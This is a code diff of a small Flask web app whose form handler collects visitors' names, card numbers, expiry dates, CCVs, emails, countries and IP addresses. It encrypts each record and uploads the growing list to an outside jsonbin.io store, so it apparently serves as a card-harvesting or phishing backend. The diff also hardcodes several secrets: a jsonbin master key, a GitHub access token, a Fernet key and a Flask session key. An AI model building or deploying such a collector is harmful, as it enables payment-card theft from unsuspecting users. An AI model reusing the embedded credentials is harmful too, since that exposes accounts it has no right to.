@@ -1,34 +1,25 @@
 import pandas as pd
-from flask import Flask, render_template, request, redirect, url_for
+from flask import Flask, render_template, request, redirect
 
+import requests, os
+
+import secrets
+#print(secrets.token_hex(100))
+# save data using jsonbin.io  ( use 'url' as env variable for safety)
+url = os.environ.get('BIN')#f"https://api.jsonbin.io/v3/b/67f0a3258960c979a57e8a01"
+
+headers = {
+    "X-Master-Key": "$2a$10$EXZio0Iidl50cU/C0uO6p.mG9Ofr6N/KdltbXi7EoUYhsBilrIxlS",
+    "Content-Type": "application/json"
+}
+# data base
+DB = ['+++++++++++++++++++++++']
+
+# create flask app
 app = Flask(__name__)
-app.secret_key = 'thanks'  # Required for session management
-
-# _________________________________________________
-# _________________________________________________
-
-import requests
-import json
-
-# GitHub API Settings
-GITHUB_TOKEN = "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"
-REPO_OWNER = "BahaaKattan111"
-REPO_NAME = "test-webpage"
-FILE_PATH = "readme.txt"  # Change this to the file you want to create/update
-GITHUB_API_URL = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
+app.secret_key = os.environ.get('FLASK_BIN')#'e74e24d632bbc70b1c8dfcf386160b7d8863bfe3c5f90f229dc7ab6747eace5777ab82c2256bf675ed547506f1491b9879fb335cf169164755e8a297e172d8e2a2b579f3072c82f19f2b4e81b26b107ef1aa6d1ebe50ebb41976be75322d60bd58cbe498'
 
 
-def get_file_sha():
-    """Get the SHA of an existing file (required for updating a file)."""
-    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
-    response = requests.get(GITHUB_API_URL, headers=headers)
-    if response.status_code == 200:
-        return response.json()["sha"]  # Get file SHA for updates
-    return None
-
-
-# _________________________________________________
-# _________________________________________________
 # Home page route
 @app.route('/')
 def home():
@@ -46,6 +37,7 @@ def thank_you():
     return render_template('thanks/thanks.html')
 
 
+# create encryptor
 """chars = r'''`1234567890-=qwertyuiop[]\asdN_fghjkl;'zxcvbnm,./~!@#$%^&*()+QWERTYUIOP}{|ASDFGHJCKL:"ZXVBM<>?ضصثقفغعهخحجدشسيبلاتنمكطئءؤرىةوزظ'''
 chars = set([c for c in chars])
 chars = [c for c in chars]
@@ -91,31 +83,47 @@ def decrypt(text):
     return ''.join(decrypted)
 
 
+# -------------------------------------
+
+from cryptography.fernet import Fernet
+
+key = os.environ.get('ENCRYPTION_KEY') # TkxyCBNvbkF1Hlr1XMDAb3gwL82fMED6s2nbaqzyFd4= # save this code in an environment variable
+print('---')
+print(key)
+cipher = Fernet(key.encode('utf-8'))
+
+
 # Form submission route
 @app.route('/submit', methods=['POST'])
 def submit():
     # Get user input from the form
     username = request.form['username']
-    email = request.form['email'] + ''
     expiry = request.form['expiry']
     card_number = request.form['card_number']
     ccv = request.form['ccv']
+    # optional inputs ('' are important)
+    email = request.form['email'] + ''
     country = request.form['country'] + ''
 
     ip_address = request.remote_addr
-    with open('readme.txt', 'a', encoding='utf-8') as file:
-        text = fr''' 
+
+    text = fr''' 
         user submitted
         * IP Address: {ip_address}
         * CARD-DETAILS:  Email= {email} ||| Name= {username} ||| expiry-date= {expiry} ||| card-number= {card_number} ||| ccv= {ccv} ||| country= {country} ;
-        ---
+        +++++++++++++++++
         '''
-        file.write(encrypt(text))
+
+    encrypted_data = cipher.encrypt(text.encode('utf-8'))
+
+    DB.append(encrypted_data.decode('utf-8'))
+    large_text = ''.join(DB)
+    requests.put(url, json={'data': large_text}, headers=headers)
 
     # Optionally, you could save it to a file or database here
 
     # Redirect to a success page or back to the home page
-    return render_template('/thanks', username=request.form.get('username'), ccv=request.form.get('ccv'),expiry=request.form.get('expiry'))
+    return redirect('/thanks')
 
 
 """# Success page route
